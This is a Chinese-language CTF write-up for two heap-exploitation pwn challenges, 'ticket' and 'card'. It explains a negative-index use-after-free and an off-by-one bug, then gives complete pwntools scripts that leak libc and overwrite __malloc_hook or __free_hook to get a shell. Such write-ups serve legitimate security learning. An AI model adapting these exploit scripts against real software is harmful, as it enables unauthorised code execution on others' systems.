# DASCTF_BUUCTF_May_pwn_wp




能在`buuctf`上打比赛还是很舒服的，两道`pwn`题比较基础，`wp`就随便写一下啦！
<!-- more -->

### 1、ticket

#### checksec

![image-20210529205152160](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529205152160.png)

运行环境为`ubuntu16.04`，`libc-2.23.so`

#### 题目分析

常见的菜单题，这里主要分析一下`bss`段的数据分布：

![image-20210529205623751](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529205623751.png)

需要注意的地方有：

- 可以添加`0≤ idx <=5`的`ticket`堆块，但是只能删除`idx < 3`的`ticket`堆块
- 基本上围绕`ticket`的操作都是以`heap_size`来进行判断的，而且释放堆块后对应的大小会置为`0`
- `edit_info`和`show_info`似乎并没有什么用

#### 漏洞分析

漏洞点在于两个地方，都在`del_ticket`函数中。

第一处是未校验索引大小，使得索引可以为负数。

第二处是存在`UAF`，可以利用残留信息泄露出`libc`地址。释放堆块的时候只把存储`size`的地方置为了`0`，指针没有置空。

![image-20210529204826881](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529204826881.png)



#### 利用思路

在`bss`堆布局可以看到，`age`的值可控，因此可以将`age`写为`bss`地址，然后释放掉`bss_fake_chunk`，控制索引为`2`、`3`的`chunk`的大小，可以越界写。

![image-20210529210159875](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529210159875.png)

利用步骤即为：

- 利用`unsorted bin`残留的信息泄露出`libc`地址
- 利用`del_ticket(-3)`释放`bss_fake_chunk`
- 控制`chunk`的大小，使得能越界写`chunk`
- 利用越界写，构造一个`freed 0x70`大小的`chunk`，修改其`fd`为`__malooc_hook - 0x23`
- 利用`realloc + one_gadget`来获取`shell`

#### 最终exp

**调试过程**：

释放假的`chunk`：

![image-20210529214331150](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529214331150.png)

越界修改`fd`：

![image-20210529214430684](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529214430684.png)

修改`realloc_hook`和`malloc_hook`：

![image-20210529214528797](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529214528797.png)



```python
from pwn import *

LOG_ADDR = lambda x, y: "{} ---> {}".format(x, hex(y))
sh = process('./ticket')
libc = ELF('./libc-2.23.so')
gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

context.update(arch="amd64", endian="little", os='linux')

def welcome(name, saying, age:int):
    sh.sendafter("Your name: \n", name)
    sh.sendafter("what do you want to say before take off(wu hu qi fei): \n", saying)
    sh.sendlineafter("Your age: \n", str(age))


def add_ticket(idx, size):
    sh.sendlineafter(">> ", '1')
    sh.sendlineafter("Index: \n", str(idx))
    sh.sendlineafter("Remarks size: \n", str(size))
    sh.recvline()


def del_ticket(idx):
    sh.sendlineafter(">> ", '2')
    sh.sendlineafter("Index: \n", str(idx))
    sh.recvline()


def edit_ticket(idx, remark):
    sh.sendlineafter(">> ", '3')
    sh.sendlineafter("Index: \n", str(idx))
    sh.sendafter("Your remarks: \n", remark)
    sh.recvline()

def show_ticket(idx):
    sh.sendlineafter(">> ", '4')
    sh.sendlineafter("Index: \n", str(idx))
    msg = sh.recvline()
    log.info("msg recv:{}".format(msg))
    return msg

# construct a fake-chunk at bss segment
welcome("xxxx", "xxxx", 0x6020e0)
add_ticket(1, 0x21) # chunk1
add_ticket(2, 0x100)
add_ticket(3, 0x10)
add_ticket(5, 0x21)

# free fake-chunk
del_ticket(-3)

# re-malloc fake-chunk by chunk0
add_ticket(0, 0x18)

# recover chunk2's size and reset chunk3's size
edit_ticket(0, p64(0x100) + p64(0))

# leak libc addr
del_ticket(2)
add_ticket(2, 0x100)
msg = show_ticket(2)
leak_libc_addr = u64(msg[-7:-1] + b"\x00\x00")
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

# calc some useful address
target_addr = libc.sym["__malloc_hook"] - 0x23
system_addr = libc.sym['system']
realloc_addr = libc.sym['realloc']
one_gadget = libc.offset_to_vaddr(gadgets[1])

# change chunk2's size to overflow
edit_ticket(0, p64(0x10000))

# get freed 0x70 chunk
del_ticket(1)
add_ticket(1, 0x60)
del_ticket(1)

# change free-chunk's fd-ptr to target_addr
layout = [[0] * 32, 0x110, 0x21, [0] * 3, 0x31, [0] * 5, 0x71, target_addr]
edit_ticket(2, flat(layout))

# fastbin attack
add_ticket(1, 0x60)
add_ticket(3, 0x60)
layout = [0xb * "a", one_gadget, realloc_addr + 0xd]
edit_ticket(3, flat(layout))

# get shell by malloc_hook(one_gadget)
sh.sendlineafter(">> ", "5")

sh.interactive()
```

远程打：

![image-20210529214744617](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529214744617.png)

### 2、 card

#### checksec

![image-20210529221936646](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529221936646.png)

运行环境为`ubuntu18.04`， `libc-2.27.so`

#### 题目分析

写得花里胡哨的菜单题，有`malloc`、`free`、`edit`、`show`功能，先来看`bss`段布局：

![image-20210529222539237](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529222539237.png)

分布很简单，左边存储用户输入的大小，右边存储分配的指针

需要注意的有：

- 所有的`chunk`的大小限定在`0-256`之间
- 根据`libc`判断出来堆会使用`tcache bin`机制

#### 漏洞分析

`call`函数存在一个`off by one`：

![image-20210529222944848](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529222944848.png)

可以直接把`0-256`之间的每个数带进去算一遍，很多数都会使得`v0+v1 = v0+1`，部分数会让`v1`计算得到`0`。

#### 利用思路

带有`tcache bin`机制的`off by one`，直接利用`unlink`，搞个`0x90---0x20---0x90`的三明治，然后覆盖`__free_hook`为`system`，释放带有`/bin/sh`的块即可获得`shell`。

详细利用步骤为：

- 填满`0x90`大小的`tcache bin`
- 构造三明治布局，`0x90---0x20---0x90`
- 利用`off by one`和`unlink`，得到`0x140`的块，并包含释放状态的`0x20`的堆块
- 利用堆残留指针泄露出`libc`地址
- 修改`freed chunk 0x20`的`fd`指针为`__free_hook`地址
- `tcache bin posioning`覆盖`__free_hook`为`system`地址
- 释放带有`/bin/sh`的块获取`shell`

#### 最终exp

**调试过程**：

`off by one`修改`pre_inuse`位：

![image-20210529231331105](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529231331105.png)

`unlink`：

![image-20210529231440625](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529231440625.png)

泄露地址并修改`fd`指针：

![image-20210529231516464](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529231516464.png)

```python
from pwn import *

LOG_ADDR = lambda x, y: "{} ---> {}".format(x, hex(y))
sh = process('./pwn')
libc = ELF('./libc.so')
context.update(arch="amd64", os='linux', endian="little")

def fight(idx, size, data="a"):
    sh.sendlineafter("choice:", "1")
    sh.sendlineafter("please choice your card:", str(idx))
    sh.sendlineafter("Infuse power:\n", str(size))
    sh.sendafter("quickly!", data)


def call(idx, data):
    sh.sendlineafter("choice:", "2")
    sh.sendlineafter("please choice your card\n", str(idx))
    sh.sendafter("start your bomb show\n", data)

    
def play(idx):
    sh.sendlineafter("choice:", "3")
    sh.sendlineafter("Which card:", str(idx))


def show(idx):
    sh.sendlineafter("choice:", "4")
    sh.sendlineafter("index:", str(idx))
    sh.recvuntil("dedededededede:")
    msg = sh.recvuntil("Dededededededede~~~~~~~~~~\n")
    log.info("msg recv:{}".format(msg))
    return msg


# malloc 7 chunks
for i in range(7):
    fight(i, 0x80)

# get sandwich-chunk
fight(7, 0x80)
fight(8, 0x18)
fight(9, 0x80)
fight(10, 0x10, "/bin/sh\x00") # gap top-chunk

# fulfill tcache bin[0x90]
for i in range(7):
    play(i)

play(7)
# off by one
call(8, b"a" * 0x10 + p64(0xb0) + b"\x90")

# unlink
play(8)
play(9)

# leak_addr
fight(0, 0xa0, "a" * 8)
msg = show(0)
leak_libc_addr = u64(msg[8:16])
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3ebdd0
libc.address = libc_base_addr

# change fd-ptr
call(0, b"a" * 0x88 + p64(0x21) + p64(libc.sym['__free_hook']))

# tcache bin attack
fight(1, 0x10)
fight(2, 0x10, p64(libc.sym['system']))

# get shell
play(10)

sh.interactive()
```

远程打：

![image-20210529231636060](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210529231636060.png)



### 博客地址

<https://roderickchan.github.io/>



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-05-29-dasctf-buuctf-may-pwn-wp/  

